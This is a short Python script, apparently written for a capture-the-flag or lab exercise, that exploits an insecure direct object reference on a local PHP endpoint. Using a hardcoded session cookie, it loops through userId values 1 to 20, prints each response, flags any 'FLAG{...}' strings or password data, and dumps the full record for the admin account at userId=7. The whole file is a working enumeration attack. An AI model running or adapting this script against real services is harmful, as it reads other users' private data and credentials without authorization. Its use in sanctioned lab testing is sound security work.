import requests
import re

# Simple configuration
url_base = "http://127.0.0.1:33156"
endpoint = "/api/get_favorite_restaurants.php"
cookie = {"PHPSESSID": "j2jbue9ik42nla625rupl7v2jk"}

print("Starting IDOR enumeration")
print(f"Target: {url_base}{endpoint}")
print(f"Range: userId=1 to userId=20")
print("="*70)

# Test each user ID
for user_id in range(1, 21):
    try:
        url = f"{url_base}{endpoint}?userId={user_id}"
        print(f"\nTesting userId={user_id}")
        
        resp = requests.get(url, cookies=cookie, timeout=10)
        print(f"Status: {resp.status_code}")
        
        if resp.status_code == 200:
            content = resp.text
            print(f"Length: {len(content)} bytes")
            print(f"Response: {content[:250]}")
            
            # Check for flag
            flag_match = re.search(r'FLAG\{[^}]+\}', content)
            if flag_match:
                print(f"[!] FLAG FOUND: {flag_match.group()}")
            
            # Check for password
            if "password" in content.lower():
                print(f"[!] PASSWORD INFO FOUND")
            
            # Special note for admin (userId=7)
            if user_id == 7:
                print(f"[!] ADMIN DATA RETRIEVED - userId=7")
                print(f"Full response: {content}")
        else:
            print("No data retrieved")
            
    except Exception as e:
        print(f"Error: {e}")

print("\n" + "="*70)
print("Enumeration complete")
